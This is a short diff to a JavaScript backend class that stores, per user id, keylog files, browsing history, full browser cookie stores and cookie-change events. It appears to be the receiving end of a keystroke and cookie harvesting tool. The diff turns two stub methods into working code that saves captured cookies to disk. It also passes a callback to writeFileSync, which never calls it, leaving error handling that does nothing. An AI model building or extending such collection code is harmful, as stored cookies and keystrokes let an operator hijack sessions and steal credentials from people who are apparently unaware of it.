@@ -1,7 +1,7 @@
 import fs from "fs";
 
 const writeJSON = (path, data) => {
-    fs.writeFile(path, JSON.stringify(data, null, 2), function (err) {
+    fs.writeFileSync(path, JSON.stringify(data, null, 2), function (err) {
         if (err) {
             console.log(err);
         }
@@ -16,7 +16,9 @@ export default class SaveData {
     constructor() {
         this.dataFolder = "backend/data";
         this.makePath = (uid) => `${this.dataFolder}/${uid}.json`;
-        this.makeKeylogPath = (uid) => `${this.dataFolder}/keylog_${uid}.txt`;
+        this.makeKeylogPath = (uid) => `${this.dataFolder}/${uid}_keylog.txt`;
+        this.makeCookieStorePath = (uid, storeId, time) =>
+            `${this.dataFolder}/${uid}_cookieStore_${storeId}_${time}.json`;
         this.data = {};
     }
 
@@ -57,9 +59,10 @@ export default class SaveData {
         }
     }
 
-    addHistoryItem(uid, historyItem) {
+    addHistoryItem(uid, date, historyItem) {
         if (this.getUser(uid)) {
             this.data[uid].history.unshift(historyItem);
+            this.data[uid].history_updated = date;
             this.updateUser(uid);
         }
     }
@@ -94,10 +97,19 @@ export default class SaveData {
     }
 
     addCookieStore(uid, time, storeId, cookies) {
-        return;
+        if (uid) {
+            writeJSON(this.makeCookieStorePath(uid, storeId, time), cookies);
+        }
     }
 
     cookieChange(uid, time, details) {
-        return;
+        if (this.getUser(uid)) {
+            if (!this.data[uid].cookieChange) {
+                this.data[uid].cookieChange = [{ time, details }];
+            } else {
+                this.data[uid].cookieChange.push({ time, details });
+            }
+            this.updateUser(uid);
+        }
     }
 }
